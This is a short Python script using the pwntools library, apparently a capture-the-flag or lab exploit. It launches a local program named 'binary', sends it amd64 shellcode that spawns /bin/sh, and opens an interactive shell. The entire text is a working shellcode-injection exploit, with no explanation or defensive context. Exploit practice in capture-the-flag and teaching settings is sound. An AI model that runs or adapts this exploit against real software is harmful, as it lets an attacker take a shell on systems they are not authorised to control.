from pwn import *
context.arch="amd64"
context.log_level='debug'
p=process("./binary")
p.recv()
p.sendline(asm(shellcraft.sh()))
p.interactive()
